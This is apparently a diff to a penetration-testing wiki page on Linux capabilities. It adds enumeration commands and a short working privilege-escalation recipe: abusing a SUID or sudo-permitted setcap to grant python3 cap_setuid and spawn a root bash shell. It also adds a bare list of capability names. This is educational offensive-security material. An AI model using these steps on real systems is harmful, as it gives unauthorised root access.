@@ -1,4 +1,4 @@
-# 🛠️ Capabilities
+# Capabilities
 
 ## Theory
 
@@ -59,6 +59,10 @@ capsh --decode=0000003fffffffff
 
 ### Binaries Capabilities
 
+{% hint style="danger" %}
+Having the capability =ep means the binary has all the capabilities
+{% endhint %}
+
 {% tabs %}
 {% tab title="Enumerate" %}
 Binaries can have capabilities that can be used while executing. We can search binaries with capabilities as follow
@@ -72,6 +76,83 @@ getcap -r / 2>/dev/null
 If you find that a binary have interesting capabilities, you can check on [GTFOBins](https://gtfobins.github.io/) for known exploits.
 {% endtab %}
 {% endtabs %}
+
+### Setcap with SUID/SUDO
+
+{% tabs %}
+{% tab title="Enumerate" %}
+If you found the `setcap` binary with the SUID bit or with SUDO permissions, you can obtain root access.
+
+```bash
+#SUID
+$ find / -type f -perm -4000 2>/dev/null
+/usr/sbin/setcap
+
+#SUDO
+$ sudo -l
+    (root) NOPASSWD: /usr/sbin/setcap /home/<user>/*
+```
+{% endtab %}
+
+{% tab title="Exploit" %}
+For example, we can leverage the `CAP_SETUID` capabilities with the `python` binary&#x20;
+
+```bash
+#SUID setcap example
+cp /usr/bin/python3 /home/<user>/python3
+setcap cap_setuid+ep /home/<user>/python3
+
+#Exploit
+/home/<user>/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+{% endtab %}
+{% endtabs %}
+
+### Interesting Capabilities
+
+#### CAP\_SYS\_ADMIN
+
+CAP\_SYS\_PTRACE
+
+CAP\_SYS\_MODULE
+
+CAP\_DAC\_READ\_SEARCH
+
+CAP\_DAC\_OVERRIDE
+
+CAP\_CHOWN
+
+CAP\_FOWNER
+
+CAP\_SETUID
+
+CAP\_SETGID
+
+CAP\_SETFCAP
+
+CAP\_SYS\_RAWIO
+
+CAP\_KILL
+
+CAP\_NET\_BIND\_SERVICE
+
+CAP\_NET\_RAW
+
+CAP\_NET\_ADMIN + CAP\_NET\_RAW
+
+CAP\_LINUX\_IMMUTABLE
+
+CAP\_SYS\_CHROOT
+
+CAP\_SYS\_BOOT
+
+CAP\_SYSLOG
+
+CAP\_MKNOD
+
+CAP\_SETPCAP
+
+
 
 ## References
 
